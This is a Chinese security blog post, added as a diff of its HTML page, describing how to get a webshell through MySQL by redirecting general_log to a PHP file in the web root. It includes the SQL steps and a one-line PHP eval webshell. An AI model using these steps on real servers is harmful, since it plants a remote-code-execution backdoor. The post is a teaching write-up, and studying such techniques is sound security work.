@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-157457995-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  数据库getShell &ndash; 阿富的在线稿子
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="数据库的getshell方法汇总，持续更新……
+借助数据库的getshell方法汇总，持续更新……
+|blog under go1f.cc">
+    
+
+    <meta name="apple-mobile-web-app-title" content="阿富的在线稿子">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="数据库getShell | 阿富的在线稿子">
+    <meta name="twitter:description" content="数据库的getshell方法汇总，持续更新……
+借助数据库的getshell方法汇总，持续更新……|blog under go1f.cc">
+    <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
+    阿富的在线稿子
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>公告栏</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/notes/">
+      
+      <span>低质笔记</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/blog/">
+      
+      <span>博客</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/about/">
+      
+      <span>简历</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">数据库getShell</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+<a href='/categories/web%E5%AE%89%E5%85%A8' class="muted-link">
+  <span class="Label Label--gray-darker">Web安全</span>
+</a>
+
+
+
+<a href='/tags/getshell' class="muted-link">
+  <span class="Label Label--gray">getshell</span>
+</a>
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2020-02-14. Published at: 2020-01-06.">
+        
+          Lastmod: 2020-02-14
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>数据库的getshell方法汇总，持续更新……</p>
+<p>借助数据库的getshell方法汇总，持续更新……</p>
+<h2 id="mysql">MySQL</h2>
+<h3 id="general_log日志利用">general_log日志利用</h3>
+<p>mysql5.0版本以上会创建日志文件，可以通过修改日志的全局变量getshell。</p>
+<blockquote>
+<p>general_log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</p>
+<p>general_log_file 指的是日志的保存路径。</p>
+<p>开启 general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在general_log_file指定的文件路径的文件。</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SHOW</span> <span class="n">VARIABLES</span> <span class="k">LIKE</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">general%</span><span class="s1">&#39;</span><span class="p">;</span>
+<span class="k">SELECT</span> <span class="o">@</span><span class="o">@</span><span class="n">general_log</span><span class="p">;</span>
+</code></pre></div><ol>
+<li>开启general_log</li>
+<li>设置general_log_file的值修改为网站路径的php文件。</li>
+<li>通过log日志进行写入一句话木马。</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="kt">set</span> <span class="p"></span><span class="n">global</span> <span class="n">general_log</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="s2">ON</span><span class="s2">&#34;</span><span class="p">;</span>
+<span class="kt">set</span> <span class="p"></span><span class="n">global</span> <span class="n">general_log_file</span> <span class="o">=</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">C:\\phpStudy\\PHPTutorial\\WWW\\mylog.php</span><span class="s1">&#39;</span><span class="p">;</span>
+<span class="k">select</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">&lt;?php eval($_POST[a]);?&gt;</span><span class="s1">&#39;</span><span class="p">;</span>
+</code></pre></div>
+  </section>
+
+  <section>
+    
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "go1f" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>数据库getShell</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#mysql">MySQL</a>
+      <ul>
+        <li><a href="#general_log日志利用">general_log日志利用</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    ©go1f 2020 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
